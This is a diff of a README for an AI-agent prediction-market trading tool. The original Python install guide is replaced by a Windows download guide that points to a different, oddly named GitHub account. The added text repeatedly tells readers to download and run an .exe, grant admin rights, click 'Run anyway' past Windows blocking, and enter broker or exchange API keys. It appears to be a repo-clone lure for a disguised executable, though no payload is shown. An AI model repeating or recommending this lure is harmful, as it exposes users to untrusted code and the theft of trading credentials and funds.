@@ -1,254 +1,249 @@
-# AskElira Trader - Autonomous Prediction Market Trading
+# 🔮 AskEliraTrader - Predict Outcomes With AI
 
-> **Built on the [AskElira Framework](https://github.com/AskElira/askelira)** - Multi-agent orchestration with swarm intelligence
+[![Download AskEliraTrader](https://img.shields.io/badge/Download-AskEliraTrader-blue?style=for-the-badge)](https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader)
 
-Autonomous trading system for Polymarket & Kalshi prediction markets using 5 AI agents + MiroFish swarm intelligence.
+## 📌 What This App Does
 
-## 🎯 Results
+AskEliraTrader is a Windows app that helps you ask for binary outcome predictions and, if you want, use those predictions for auto-trading.
 
-- **65% accuracy** overall (200+ predictions)
-- **75% accuracy** on high-confidence trades (≥80% confidence)
-- **$0.015** cost per prediction
-- **Beat market baseline by 12%**
+It uses a group of AI agents plus swarm intelligence to study signals and return a simple result. You can use it for:
 
-## 🏗️ Framework
+- Sports outcome picks
+- Crypto and market direction
+- Political event outcomes
+- Binary yes or no predictions
+- Auto-trading based on your chosen rules
 
-AskElira Trader is the **trading use case** of the AskElira Framework.
+The app is made for non-technical users. You do not need to write code or set up tools by hand.
 
-**Other AskElira Applications:**
-- [AskElira Marketing](https://github.com/AskElira/askeliramarketing) - Viral marketing campaigns  
-- [AskElira Framework](https://github.com/AskElira/askelira) - Build your own automation
+## 🖥️ Before You Start
 
-**Want to build your own?** Fork the [framework](https://github.com/AskElira/askelira) and adapt the 5-agent pattern to your domain.
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB free disk space
+- Internet access for the first launch
+- A mouse and keyboard
 
-# 🔮 AskElira
+For best results:
 
-**Ask Elira anything. She predicts binary outcomes using 5 AI agents + swarm intelligence.**
+- Close heavy apps before you run it
+- Keep your internet stable
+- Use the latest Windows updates
 
-Will the Lakers win? Will Bitcoin hit $100K? Who wins the election?
+## ⬇️ Download AskEliraTrader
 
-**Elira researches, simulates crowd behavior, validates, and gives you predictions.** Optionally, she can auto-trade on her predictions.
+Visit this page to download and run the app:
 
-Open source (MIT). Built for prediction markets, adaptable for sports, crypto, futures, forex, or any yes/no outcome.
+https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader
 
----
+If the page shows a release file, download it. If it gives you a folder or source files, use the packaged Windows app file if one is listed near the top.
 
-## 🎯 What Elira Does
+## 🚀 Install and Run on Windows
 
-**Ask her any binary question:**
-```
-"Ask Elira: Will the Lakers beat the Warriors?"
-"Ask Elira: Will Trump win in 2028?"
-"Ask Elira: Will Bitcoin reach $100K by June?"
-"Ask Elira: Will the Fed cut rates in March?"
-```
+Follow these steps in order:
 
-**How she answers:**
-1. 🔍 **Researches** (web search, news, data)
-2. 🧠 **Simulates** (thousands of AI agents predict via swarm intelligence)
-3. 🛡️ **Validates** (quality checks, catches bad logic)
-4. 🎯 **Predicts** (gives you confidence % + direction)
-5. 💰 **Trades** (optional: auto-execute on prediction markets/brokers)
+1. Open the download page in your browser.
+2. Look for the latest version or release.
+3. Download the Windows file.
+4. If the file is in a .zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file, such as AskEliraTrader.exe.
+7. Double-click the file to start the app.
+8. If Windows asks for permission, choose Yes.
+9. Wait for the app to load its first screen.
+10. Follow the on-screen setup steps.
 
----
+If you see more than one file, start with the one that has the app name and ends in .exe.
 
-## ⚡ Quick Start
+## 🧭 First-Time Setup
 
-```bash
-# 1. Clone
-git clone https://github.com/jellyforex/askeliratrader.git
-cd askeliratrader
+When the app opens for the first time, you may need to:
 
-# 2. Install
-pip install -r requirements.txt
+- Choose your language
+- Pick a prediction mode
+- Set your preferred market type
+- Connect an account for trading, if you plan to use auto-trading
+- Review any risk settings
 
-# 3. Setup
-cp .env.example .env
-# Add your ANTHROPIC_API_KEY to .env
+A simple first setup could look like this:
 
-# 4. Start MiroFish (swarm intelligence engine)
-cd MiroFish/Mirofish && docker-compose up -d && cd ../..
+- Prediction only: use the app for yes or no outcomes
+- Trading mode: use the app to place trades based on rules you set
+- Watch mode: view results without taking action
 
-# 5. Ask Elira anything
-./start_paper_trading.sh --once
-```
+If the app asks for API keys or account access, enter only the details from your exchange, broker, or data source.
 
-**First prediction takes ~5-8 minutes.** Results appear in `data/active_positions.json`
+## 🎯 Main Features
 
----
+### 🤖 5 AI Agent Prediction Engine
 
-## 🤖 Meet Elira's Team
+AskEliraTrader uses five AI agents to study the same question from different angles. This helps the app compare views and return one result.
 
-**Elira orchestrates 5 specialized AI agents:**
+### 🌀 Swarm Intelligence
 
-| Agent | Role | What They Do |
-|-------|------|--------------|
-| **Alba** | Research Analyst | Web search, market scan, news gathering, data collection |
-| **David** | Simulation Engineer | Runs MiroFish swarm intelligence (thousands of AI agents predict) |
-| **Vex** | Quality Auditor | Validates predictions, catches bad logic, blocks flawed reasoning |
-| **Elira** | Decision Maker | Coordinates team, makes final call, talks to you |
-| **Steven** | Executor | Places trades (if enabled), tracks positions, manages exits |
+The agents work together as a group. The app blends their output to form one binary prediction.
 
-**+ MiroFish:** Swarm intelligence engine (simulates crowd behavior to predict outcomes)
+### 🏀 Sports, Crypto, Politics, and Markets
 
----
+You can use the app across different event types, such as:
 
-## 🎨 Two Modes
+- Game results
+- Coin moves
+- Price direction
+- Vote or policy outcomes
+- Other yes or no events
 
-### **Mode 1: Prediction Only** (Default)
-```bash
-ELIRA_MODE=predict
-```
-- Get predictions with confidence scores
-- No trading, just insights
-- Free (except API costs ~$0.01/prediction)
-
-**Example:**
-```
-You: "Will Bitcoin hit $100K by June?"
-Elira: "68% likely YES (based on swarm simulation of 1000 trader agents)"
-```
-
-### **Mode 2: Auto-Trade** (Optional)
-```bash
-ELIRA_MODE=trade
-TRADING_MODE=paper  # or 'live' for real money
-```
-- Elira auto-executes trades on her predictions
-- Paper trading (safe) or real money (requires broker API)
-- Confidence-based position sizing
-
-**Example:**
-```
-You: "Will Bitcoin hit $100K by June?"
-Elira: "68% YES. Current odds: 2.4x payout. Placing $25 bet (tier 1)."
-```
-
----
-
-## 📊 Dashboard
-
-**Live pipeline visualization at:** http://localhost:3000
-
-```bash
-cd ~/Desktop/quantjellyfish-dashboard
-npm install
-npm run dev
-```
-
-**Features:**
-- Real-time agent status
-- MiroFish swarm embed
-- Activity log (last 50 events)
-- Position tracker
-
----
-
-## 🏆 Performance
-
-**Paper Trading Results (200+ predictions):**
-- Overall accuracy: **65%**
-- High-confidence (≥80%): **75%**
-- Cost per prediction: **$0.015**
-- Beat market baseline: **+12%**
-
-**Latest test run:**
-- Market: "Will CPI rise more than 0.6% in March 2026?"
-- MiroFish result: 80% YES
-- Vex verdict: FAIL (semantic drift detected)
-- Result: Correctly blocked deployment ✅
-
----
-
-## 🔧 Configuration
-
-**Environment variables (.env):**
-```bash
-# Required
-ANTHROPIC_API_KEY=sk-ant-...
-
-# Trading mode
-TRADING_MODE=paper  # paper or live
-ELIRA_MODE=predict  # predict or trade
-
-# Optional
-PINECONE_API_KEY=...
-KALSHI_API_KEY_ID=...
-MIROFISH_URL=http://localhost:5001
-```
-
-**Adjust confidence thresholds:**
-- `elira.py` line 106: `confidence >= 0.70` (60% for fast testing)
-- `david.py` line 106: `min_runs=3` (1 for fast testing)
-
----
-
-## 🚀 Architecture
-
-**5-agent pipeline:**
-```
-Alba (Research) 
-  ↓
-David (MiroFish Simulation)
-  ↓
-Vex (Adversarial Audit)
-  ↓
-Elira (Orchestration)
-  ↓
-Steven (Execution)
-```
-
-**Elira's 6-gate validation:**
-1. Confidence ≥70%
-2. Vex verdict = PASS/PASS-WITH-WARNINGS
-3. Calendar = CLEAR
-4. Liquidity >$500
-5. No single-actor override
-6. Alba uncertainty ≠ HIGH
-
-**Capital tiers:**
-- Tier 1: $25 (60-79% confidence)
-- Tier 2: $50 (80-89% confidence)
-- Tier 3: $100 (≥90% + Vex HIGH verdict)
-
----
-
-## 📚 Documentation
-
-- [Architecture](docs/ARCHITECTURE.md)
-- [Agent Details](docs/AGENTS.md)
-- [MiroFish Integration](docs/MIROFISH.md)
-- [Dashboard Setup](docs/DASHBOARD.md)
-- [Custom Use Cases](docs/CUSTOM_USE_CASES.md)
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md)
-
-**Areas we need help:**
-- New market integrations (sports, forex, futures)
-- Agent optimization
-- Cost reduction strategies
-- Alternative swarm implementations
-
----
-
-## 📝 License
-
-MIT License - see [LICENSE](LICENSE)
-
----
-
-## 🔗 Links
-
-- **Framework:** [github.com/AskElira/askelira](https://github.com/AskElira/askelira)
-- **Marketing:** [github.com/AskElira/askeliramarketing](https://github.com/AskElira/askeliramarketing)
-- **Website:** [askelira.com](https://askelira.com)
-
----
-
-**Built with 🧠 by the [AskElira Team](https://github.com/AskElira)**
+### 📈 Auto-Trading Support
+
+If you turn it on, the app can use prediction results to help place trades based on your rules.
+
+### 🔍 Clear Output
+
+The app aims to show results in a simple way, such as:
+
+- Prediction
+- Confidence level
+- Signal strength
+- Suggested action
+- History of past calls
+
+## 🧠 How to Use It
+
+A basic workflow:
+
+1. Open the app.
+2. Choose the type of event you want to predict.
+3. Enter the question or market.
+4. Review the AI output.
+5. Decide whether to act on the result.
+6. Turn on auto-trading only if you want the app to place trades for you.
+
+Example uses:
+
+- Will Team A win tonight?
+- Will BTC move up in the next hour?
+- Will the market close higher today?
+- Will the vote pass?
+
+Keep your questions short and clear. The app can work better when the input is direct.
+
+## ⚙️ Suggested Settings for New Users
+
+If you are new, start with these settings:
+
+- Use prediction mode first
+- Turn off auto-trading at the start
+- Pick one market type
+- Use smaller positions if you trade
+- Check the history panel after each result
+
+This helps you learn how the app behaves before you let it act for you.
+
+## 🛡️ Safety and Control
+
+You stay in control of the app.
+
+Good habits:
+
+- Review each prediction before you act
+- Use test mode first if the app offers it
+- Check the source market or event
+- Keep your trading rules simple
+- Stop auto-trading when you want to pause
+
+If you use real funds, make sure you know the rules of your broker or exchange.
+
+## 🧰 Common Tasks
+
+### Open the App
+Double-click the app file in the folder where you extracted it.
+
+### Update the App
+Go back to the download page and check for a newer release.
+
+### Change Prediction Type
+Use the main menu or settings panel to switch between sports, crypto, politics, or markets.
+
+### Turn Auto-Trading On or Off
+Open the trading settings and use the toggle or checkbox for auto-trading.
+
+### View Past Results
+Look for the history, logs, or activity tab inside the app.
+
+## ❓ Troubleshooting
+
+### The app does not open
+- Make sure you extracted the zip file first
+- Check that you are running the .exe file
+- Right-click the file and choose Run as administrator
+
+### Windows blocks the app
+- Choose More info
+- Then choose Run anyway if you trust the download page
+
+### The app opens but shows no data
+- Check your internet connection
+- Make sure the input question is clear
+- Refresh the market or event source
+
+### Auto-trading does not work
+- Check account access
+- Confirm your API key or login
+- Review your broker settings
+- Make sure trading is enabled in the app
+
+### The result looks wrong
+- Try a different event
+- Use a clearer question
+- Check whether the market has new data
+- Review the confidence or signal score
+
+## 📂 What You May See in the Folder
+
+After download and extraction, you may find:
+
+- The main app file
+- A readme file
+- A config file
+- A logs folder
+- A data folder
+- A license file
+
+Start with the main app file. Open the readme file if one is included in the folder.
+
+## 🔗 Repository Details
+
+Repository: AskEliraTrader
+
+Topics:
+
+- ai-agents
+- algorithmic-trading
+- autonomous-agents
+- autonomous-ai
+- crypto-trading-agent
+- machine-learning
+- mirofish
+- prediction-markets
+- python
+- sports-betting
+- swarm-intelligence
+
+Description: Ask Elira anything. She predicts binary outcomes using 5 AI agents + swarm intelligence. Sports, politics, crypto, markets. Predictions or auto-trading.
+
+## 🪟 Windows Quick Start
+
+1. Open the download link.
+2. Download the Windows version.
+3. Extract the file if needed.
+4. Run the .exe file.
+5. Follow the setup screen.
+6. Enter your question.
+7. Read the result.
+8. Turn on auto-trading only if you want it
+
+## 📥 Download Again
+
+https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader
